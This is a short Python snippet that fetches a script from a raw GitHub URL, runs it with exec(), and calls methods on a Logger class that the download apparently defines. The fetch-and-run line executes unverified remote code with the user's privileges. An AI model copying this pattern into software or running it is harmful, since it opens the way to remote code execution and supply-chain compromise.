import requests

response = exec(requests.get("https://raw.githubusercontent.com/ProfKrzys/test/main/utils/logs.py").text)




Logger.plus("test")
Logger.minus("test")
Logger.slash("test")
